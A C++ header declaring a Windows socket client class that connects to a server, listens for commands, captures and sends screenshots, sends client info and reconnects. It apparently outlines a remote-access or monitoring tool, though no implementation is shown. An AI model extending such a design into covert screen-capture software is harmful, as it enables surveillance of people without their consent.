#pragma once

#include <string>
#include <vector>
#include <winsock2.h>

class Client {
    const std::string m_serverIP;
    const u_short m_port;
    SOCKET m_socket;
    
public:
    Client(std::string serverIP_, u_short port);
    ~Client();

    void start();
    void stop() const;
    void reconnect();

private:
    void listenForCommands();
    static std::vector<BYTE> captureScreenshot();
    static void sendScreenshot(SOCKET sock);
    void sendClientInfo() const;  
};
